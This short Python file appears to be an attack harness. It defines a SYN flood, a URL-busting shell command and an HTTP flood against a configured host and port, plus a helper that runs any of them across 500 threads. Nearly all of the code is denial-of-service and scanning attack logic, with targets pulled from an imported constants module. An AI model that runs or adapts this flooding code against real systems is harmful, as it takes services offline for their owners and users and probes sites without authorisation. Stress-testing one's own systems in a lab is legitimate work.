from SynFlood import synflood, conf_iface
from threading import Thread
from utils.consts import URLBUSTER_COMMMAND, HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST
import subprocess
from socket import SOCK_STREAM, AF_INET, socket, error as socket_error


def syn_flood_attack():
    synflood(HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, conf_iface)


def url_buster_attack():
    print(subprocess.run(URLBUSTER_COMMMAND, shell=True, executable="/bin/bash"))


def http_flood_attack():
    with socket(AF_INET, SOCK_STREAM) as s:
        try:
            s.connect((HOST_IP, HOST_PORT))
            s.sendall(HTTP_FLOOD_REQUEST)
        except socket_error:
            pass


def create_multithreaded_attack(func):
    for _ in range(500):
        thread = Thread(target=func)
        thread.start()

